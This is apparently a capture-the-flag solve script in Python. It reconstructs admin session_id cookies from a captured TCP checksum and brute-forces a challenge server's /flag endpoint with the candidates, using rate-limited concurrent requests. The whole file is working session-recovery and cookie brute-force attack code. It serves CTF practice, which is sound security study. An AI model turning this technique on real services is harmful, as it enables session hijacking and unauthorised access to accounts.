#!/usr/bin/env python3
"""Recover rfc1149a admin session candidates from the b0 TCP checksum.

This is intentionally small and self-contained.  The constants below are the
bytes we needed from the paper transcription/log:

- b0 is the first TCP segment of a 302 FOUND login response.
- the b0 IPv4 checksum validates with total length 0x0180, not 0x0100.
- the missing bytes include the complete 8-hex session_id.
- the final Date header recovered during the CTF was:
  Tue, 05 May 2026 22:20:21 GMT

By default the script only prints candidate session IDs.  Use --online to test
them against the challenge service, with an explicit rate limit.
"""

from __future__ import annotations

import argparse
import itertools
import socket
import sys
import time
from collections import Counter, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import lru_cache
from threading import Lock


HOST = "supersecretflagserverdonttellanyoneaboutit.rfc1149.ctfwithbirds.com"
IP = "34.16.111.14"

SRC = bytes([34, 16, 111, 14])
DST = bytes([10, 13, 37, 1])

B0_TOTAL_LEN = 0x0180
B0_TCP_LEN = B0_TOTAL_LEN - 20
B0_PAYLOAD_LEN = B0_TCP_LEN - 32

DEFAULT_DATE = "Tue, 05 May 2026 22:20:21 GMT"
DEFAULT_TCP_CHECKSUM = 0x61BF
DEFAULT_TCP_WINDOW = 0x01FA
HEXCHARS = "0123456789abcdef"


def fold16(total: int) -> int:
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return total


def checksum(data: bytes) -> int:
    if len(data) & 1:
        data += b"\0"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) | data[i + 1]
    return (~fold16(total)) & 0xFFFF


def raw_word_sum(data: bytes) -> int:
    if len(data) & 1:
        data += b"\0"
    return sum((data[i] << 8) | data[i + 1] for i in range(0, len(data), 2))


def b0_tcp_header_zero_checksum(window: int) -> bytes:
    # Source port 80, destination port 42408, seq/ack/options from b0.
    return (
        bytes.fromhex("0050 a5a8 f4f56c96 db5bb9ef 8010")
        + window.to_bytes(2, "big")
        + bytes.fromhex("0000 0000 0101080a00b3471200b10cca")
    )


def response_template(date_header: str, session_id: str) -> bytes:
    return (
        "HTTP/1.1 302 FOUND\r\n"
        "Server: nginx/1.22.1\r\n"
        f"Date: {date_header}\r\n"
        "Content-Type: text/html; charset=utf-8\r\n"
        "Content-Length: 189\r\n"
        "Connection: keep-alive\r\n"
        "Location: /\r\n"
        f"Set-Cookie: session_id={session_id}; Max-Age=2592000; Path=/\r\n"
        "\r\n"
        "<!doctype html>\n"
        "<html lang=en>\n"
        "<title>Redirecting...</title>\n"
        "<h1>Redirecting...</h1>\n"
        "<p>You should be redirected automatically to the target URL: "
        '<a href="/">/</a>. If not, click the link.\n'
    ).encode("ascii")


def checksum_input(date_header: str, session_id: str, window: int) -> bytes:
    payload = response_template(date_header, session_id)[:B0_PAYLOAD_LEN]
    if len(payload) != B0_PAYLOAD_LEN:
        raise ValueError(f"unexpected b0 payload length: {len(payload)}")
    pseudo = SRC + DST + bytes([0, socket.IPPROTO_TCP]) + B0_TCP_LEN.to_bytes(2, "big")
    return pseudo + b0_tcp_header_zero_checksum(window) + payload


@lru_cache(maxsize=1)
def pair4_sum_map() -> dict[int, tuple[str, ...]]:
    out: dict[int, list[str]] = defaultdict(list)
    for chars in itertools.product(HEXCHARS, repeat=4):
        s = "".join(chars)
        raw = (ord(s[0]) << 8 | ord(s[1])) + (ord(s[2]) << 8 | ord(s[3]))
        out[raw].append(s)
    return {k: tuple(v) for k, v in out.items()}


def candidates_for_date(date_header: str, tcp_checksum: int, window: int) -> list[str]:
    payload = response_template(date_header, "????????")[:B0_PAYLOAD_LEN]
    off = payload.index(b"????????")
    if off & 1:
        raise ValueError(f"unexpected odd session_id offset: {off}")

    data = bytearray(checksum_input(date_header, "00000000", window))
    abs_off = 12 + 32 + off
    data[abs_off : abs_off + 8] = b"\0" * 8

    base = raw_word_sum(bytes(data))
    target = (~tcp_checksum) & 0xFFFF
    halves = pair4_sum_map()
    raw_min = min(halves)
    raw_max = max(halves)

    candidates: list[str] = []
    for raw_a, strings_a in halves.items():
        lo = base + raw_a + raw_min
        hi = base + raw_a + raw_max
        k_min = max(0, (lo - target) // 0xFFFF - 1)
        k_max = (hi - target) // 0xFFFF + 2
        for k in range(k_min, k_max + 1):
            raw_b = target + k * 0xFFFF - base - raw_a
            strings_b = halves.get(raw_b)
            if strings_b is None:
                continue
            for a in strings_a:
                for b in strings_b:
                    sid = a + b
                    if checksum(checksum_input(date_header, sid, window)) == tcp_checksum:
                        candidates.append(sid)

    return sorted(set(candidates))


class RateLimiter:
    def __init__(self, rate: float) -> None:
        self.rate = rate
        self.next_at = time.monotonic()
        self.lock = Lock()

    def wait(self) -> None:
        with self.lock:
            now = time.monotonic()
            if now < self.next_at:
                time.sleep(self.next_at - now)
                now = self.next_at
            self.next_at = max(now, self.next_at) + 1.0 / self.rate


def request_flag(session_id: str, timeout: float) -> tuple[str, int, bytes]:
    request = (
        "GET /flag HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "User-Agent: pwn-de-queijo-rfc1149a/1.0\r\n"
        "Accept: text/html,*/*\r\n"
        f"Cookie: session_id={session_id}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("ascii")

    try:
        with socket.create_connection((IP, 80), timeout=timeout) as sock:
            sock.sendall(request)
            sock.settimeout(timeout)
            chunks: list[bytes] = []
            while True:
                try:
                    chunk = sock.recv(65536)
                except (ConnectionResetError, TimeoutError):
                    break
                if not chunk:
                    break
                chunks.append(chunk)
    except OSError as exc:
        return session_id, -1, repr(exc).encode("ascii", "replace")

    response = b"".join(chunks)
    try:
        status = int(response.split(b" ", 2)[1])
    except Exception:
        status = 0
    return session_id, status, response


def online_test(candidates: list[str], rate: float, concurrency: int, timeout: float) -> int:
    limiter = RateLimiter(rate)
    counts: Counter[int] = Counter()
    start = time.monotonic()

    def worker(sid: str) -> tuple[str, int, bytes]:
        limiter.wait()
        return request_flag(sid, timeout)

    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = [executor.submit(worker, sid) for sid in candidates]
        for i, future in enumerate(as_completed(futures), 1):
            sid, status, response = future.result()
            counts[status] += 1
            if status == 200 or b"bbb{" in response:
                print(f"[hit] session_id={sid} status={status}")
                print(response.decode("latin1", "replace"))
                return 0
            if i % 500 == 0:
                elapsed = time.monotonic() - start
                summary = ", ".join(f"{k}:{v}" for k, v in sorted(counts.items()))
                print(f"tested={i}/{len(candidates)} elapsed={elapsed:.1f}s counts={summary}", flush=True)

    print(f"no hit; counts={dict(counts)}")
    return 1


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--date", default=DEFAULT_DATE)
    parser.add_argument("--tcp-checksum", default=f"{DEFAULT_TCP_CHECKSUM:04x}")
    parser.add_argument("--tcp-window", default=f"{DEFAULT_TCP_WINDOW:04x}")
    parser.add_argument("--online", action="store_true", help="test candidates against /flag")
    parser.add_argument("--rate", type=float, default=50.0, help="max HTTP requests per second")
    parser.add_argument("--concurrency", type=int, default=20)
    parser.add_argument("--timeout", type=float, default=4.0)
    parser.add_argument("--limit", type=int, default=0, help="only test/print the first N candidates")
    args = parser.parse_args()

    tcp_checksum = int(args.tcp_checksum, 16)
    tcp_window = int(args.tcp_window, 16)
    candidates = candidates_for_date(args.date, tcp_checksum, tcp_window)
    if args.limit:
        candidates = candidates[: args.limit]

    session_off = response_template(args.date, "????????").index(b"????????")
    print(f"date={args.date!r}")
    print(f"b0_total_len=0x{B0_TOTAL_LEN:04x} b0_payload_len={B0_PAYLOAD_LEN}")
    print(f"tcp_checksum=0x{tcp_checksum:04x} tcp_window=0x{tcp_window:04x}")
    print(f"session_id_payload_offset={session_off}")
    print(f"candidates={len(candidates)}")
    print("first_candidates=" + ",".join(candidates[:10]))

    if args.online:
        return online_test(candidates, args.rate, args.concurrency, args.timeout)
    return 0


if __name__ == "__main__":
    sys.exit(main())
